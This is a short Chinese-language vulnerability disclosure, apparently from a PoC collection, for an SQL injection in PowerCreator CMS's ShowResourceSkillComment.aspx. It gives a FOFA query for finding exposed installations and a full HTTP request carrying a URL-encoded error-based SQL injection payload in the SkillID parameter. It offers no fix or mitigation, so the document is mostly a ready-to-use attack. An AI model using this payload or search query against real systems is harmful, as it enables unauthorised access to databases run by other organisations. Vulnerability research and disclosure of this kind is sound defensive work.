## PowerCreator接口ShowResourceSkillComment.aspx存在sql注入漏洞

PowerCreator接口 ShowResourceSkillComment.aspx存在sql注入漏洞。攻击者可利用该漏洞获取服务器上的信息。

## fofa

```yaml
app="PowerCreator-CMS"
```

![image](https://github.com/user-attachments/assets/fcc5c0c8-6a56-42a0-9aba-0d65b1d63a56)

## poc

```yaml
GET /ShowResourceSkillComment.aspx?rid=3&SkillID=1%20AND%204312%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284312%3D4312%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: ASP.NET_SessionId=l2wuj2tri5e554020jeezoyw; language=simpleChineses
Pragma: no-cache
Cache-Control: no-cache


```
